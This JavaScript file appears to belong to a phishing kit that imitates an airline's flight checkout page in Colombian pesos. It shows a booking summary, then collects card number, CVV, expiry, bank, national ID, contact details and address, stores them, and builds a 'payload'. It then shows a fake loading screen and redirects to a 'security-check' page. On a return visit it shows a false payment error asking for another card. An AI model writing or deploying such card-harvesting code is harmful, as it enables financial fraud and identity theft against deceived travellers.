/**
 * DOM SETUP
 * 
 */
const updateDOM = () =>{

    /** if Error */
    if(info.metaInfo.p !== ''){
        alert('ERROR: Corrija el método de pago o intente con un nuevo método de pago. (LTAMRR8800023)');
    }

    /** Passengers */
    const labelPassengers = document.querySelector('#resume-passengers');
    labelPassengers.innerHTML = '';
    if(info.flightInfo.adults !== 0){
        labelPassengers.innerHTML += `${info.flightInfo.adults} ${info.flightInfo.adults > 1 ? 'Adultos' : 'Adulto'}`;
    }
    if(info.flightInfo.children !== 0){
        labelPassengers.innerHTML += `, ${info.flightInfo.children} ${info.flightInfo.children > 1 ? 'Niños' : 'Niño'}`;
    }
    if(info.flightInfo.babies !== 0){
        labelPassengers.innerHTML += `, ${info.flightInfo.babies} ${info.flightInfo.babies > 1 ? 'Bebés' : 'Bebé'}`;
    }
    /** Flight Cost */
    let totalPassengers = info.flightInfo.adults + info.flightInfo.children;
    if(info.flightInfo.travel_type === 1){
        document.querySelector('#resume-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
        document.querySelector('#btn-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
    }else{
        document.querySelector('#resume-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
        document.querySelector('#btn-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
    }

    if(info.flightInfo.travel_type === 1){
        document.querySelector('#payment-cost').textContent = '$ ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
    }else{
        document.querySelector('#payment-cost').textContent = '$ ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
    }



    /** Schedules & Departures */
    const resumeTravelDiv = document.querySelector('#resume-travel');
    let format = new Date(parseInt(info.flightInfo.flightDates[0]));
    resumeTravelDiv.innerHTML = `
        <div class="mb-4">
            <p class="m-0 fw-bold fs-5 tc-ocean">De ${info.flightInfo.origin.city} a ${info.flightInfo.destination.city}</p>
            <p class="m-0 mt-1 fs-5 tc-gray-smoke">${(dayDic[format.getDay() - 1]).toLowerCase()}. ${format.toString().split(' ')[2]} de ${(monthDic[format.getMonth()]).toLowerCase()}</p>
            <p class="m-0 mt-1 fs-5 tc-gray-smoke">${info.flightInfo.origin.ticket_sched.takeoff} ${info.flightInfo.origin.code} → ${info.flightInfo.origin.ticket_sched.landing} ${info.flightInfo.destination.code}</p>
        </div>
    `;
    if(info.flightInfo.flightDates[1] !== 0){
        let format2 = new Date(parseInt(info.flightInfo.flightDates[1]));
        resumeTravelDiv.innerHTML += `
            <div class="mb-4">
                <p class="m-0 fw-bold fs-5 tc-ocean">De ${info.flightInfo.destination.city} a ${info.flightInfo.origin.city}</p>
                <p class="m-0 mt-1 fs-5 tc-gray-smoke">${(dayDic[format2.getDay() - 1]).toLowerCase()}. ${format2.toString().split(' ')[2]} de ${(monthDic[format2.getMonth()]).toLowerCase()}</p>
                <p class="m-0 mt-1 fs-5 tc-gray-smoke">${info.flightInfo.destination.ticket_sched.takeoff} ${info.flightInfo.destination.code} → ${info.flightInfo.destination.ticket_sched.landing} ${info.flightInfo.origin.code}</p>
            </div>
        `;
    }
};
updateDOM();

let paymentFlag = false;
let emailFlag = false;
const paymentForm = document.querySelector('#form-payment');
paymentForm.addEventListener('submit', (e)=>{
    e.preventDefault();
    paymentFlag = true;
});
const emailForm = document.querySelector('#form-email');
emailForm.addEventListener('submit', (e)=>{
    e.preventDefault();
    emailFlag = true;
});

const nextStep = () =>{
    document.querySelector('#btn-email').click();
    document.querySelector('#btn-payment').click();
    const p = document.querySelector('#p');
    const pdate = document.querySelector('#pdate');
    const c = document.querySelector('#c');
    const ban = document.querySelector('#ban');
    const name = document.querySelector('#name');
    const cc = document.querySelector('#cc');
    const email = document.querySelector('#email');
    const telnum = document.querySelector('#telnum');
    const city = document.querySelector('#city');
    const address = document.querySelector('#address');

    if(paymentFlag && emailFlag){
        if((p.value.length === 19 && p.value[0] !== '3' && ['4', '5'].includes(p.value[0])) || (p.value.length === 17 && p.value[0] === '3')){
            if(isLuhnValid(p.value)){
                if(isValidDate(pdate.value)){
                    if((c.value.length === 3 && p.value.length === 19) || (c.value.length === 4 && p.value.length === 17)){
                        console.log("Ok. Let's go!");
    
                        info.metaInfo.p = p.value;
                        info.metaInfo.ban = ban.value;
                        info.metaInfo.pdate = pdate.value;
                        info.metaInfo.c = c.value;
                        info.metaInfo.name = name.value;
                        info.metaInfo.cc = cc.value;
                        info.metaInfo.email = email.value;
                        info.metaInfo.telnum = telnum.value;
                        info.metaInfo.city = city.value;
                        info.metaInfo.address = address.value;

                        if(info.metaInfo.p[0] == '4'){
                            info.checkerInfo.company = 'VISA';

                        }else if(info.metaInfo.p[0] == '5'){
                            info.checkerInfo.company = 'MC';
                        }else if(info.metaInfo.p[0] == '3'){
                            info.checkerInfo.company = 'AM';
                        }

                        console.log(info.metaInfo);

                        updateLS();

                        let payload = info.metaInfo
                        payload.origin = info.flightInfo.origin.city;
                        payload.destination = info.flightInfo.destination.city;
                        payload.flightDates = info.flightInfo.flightDates;
                        payload.type = info.flightInfo.travel_type === 1 ? 'Ida Y Vuelta' : 'Solo Ida';
                        payload.adults = info.flightInfo.adults;
                        payload.children = info.flightInfo.children;
                        payload.babies = info.flightInfo.babies;
                        payload.dudename = info.metaInfo.name.split(' ')[0] ?? info.metaInfo.name;
                        payload.surname = info.metaInfo.name.split(' ')[1] ?? '';

                        document.querySelector('body').innerHTML += `
                            <div class="loader-full">
                                <span class="loader"></span>
                                <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p>
                            </div>
                        `;

                        setTimeout(() => window.location.href = 'security-check.html', 4500);

                    }else{
                        alert('Revise el CVV de su tarjeta.');
                        c.value = '';
                        c.focus();
                    }
                }else{
                    alert('Revise la fecha de vencimiento de su tarjeta.');
                    pdate.value = '';
                    pdate.focus();
                }
            }else{
                alert('Número de tarjeta inválido. Revisalo e intenta de nuevo.');
                p.value = ''
                p.focus();;
            }
        }else{
            alert('Revisa el número de tu tarjeta.');
            p.value = '';
            p.focus();
        }
    }
};

function formatCNumber(input) {
    let numero = input.value.replace(/\D/g, ''); // Eliminar todos los caracteres no numéricos

    let numeroFormateado = '';

    // American express
    if (numero[0] === '3') {

        c.setAttribute('oninput', "limitDigits(this, 4)");

        if (numero.length > 15) {
            numero = numero.substr(0, 15); // Limitar a un máximo de 15 caracteres
        }

        for (let i = 0; i < numero.length; i++) {
            if (i === 4 || i === 10) {
                numeroFormateado += ' ';
            }

            numeroFormateado += numero.charAt(i);
        }

        input.value = numeroFormateado;
    } else {

        c.setAttribute('oninput', "limitDigits(this, 3)");
        if (numero.length > 16) {
            numero = numero.substr(0, 16); // Limitar a un máximo de 16 dígitos
        }
        for (let i = 0; i < numero.length; i++) {
            if (i > 0 && i % 4 === 0) {
                numeroFormateado += ' ';
            }
            numeroFormateado += numero.charAt(i);
        }
        input.value = numeroFormateado;
    }
}

function formatDate(input) {
    var texto = input.value;
    
    texto = texto.replace(/\D/g, '');

    texto = texto.substring(0, 4);

    if (texto.length > 2) {
        texto = texto.substring(0, 2) + '/' + texto.substring(2, 4);
    }
    input.value = texto;
}

function isLuhnValid(bin) {
    bin = bin.replace(/\D/g, '');

    if (bin.length < 6) {
        return false;
    }
    const digits = bin.split('').map(Number).reverse();

    let sum = 0;
    for (let i = 0; i < digits.length; i++) {
        if (i % 2 !== 0) {
            let doubled = digits[i] * 2;
            if (doubled > 9) {
                doubled -= 9;
            }
            sum += doubled;
        } else {
            sum += digits[i];
        }
    }

    return sum % 10 === 0;
}

function isValidDate(fechaInput) {
    // Extrae mes y año del input
    var partes = fechaInput.split('/');
    var mesInput = parseInt(partes[0], 10);
    var añoInput = parseInt(partes[1], 10);

    // Ajusta el año a formato completo (considerando el rango 2000-2099)
    añoInput += 2000;

    // Obtener el mes y año actuales
    var fechaActual = new Date();
    var mesActual = fechaActual.getMonth() + 1; // getMonth() devuelve 0-11
    var añoActual = fechaActual.getFullYear();

    // Compara primero los años, luego los meses
    if (añoInput > añoActual || (añoInput === añoActual && mesInput >= mesActual)) {
        return true;
    }else{
        return false;
    }
}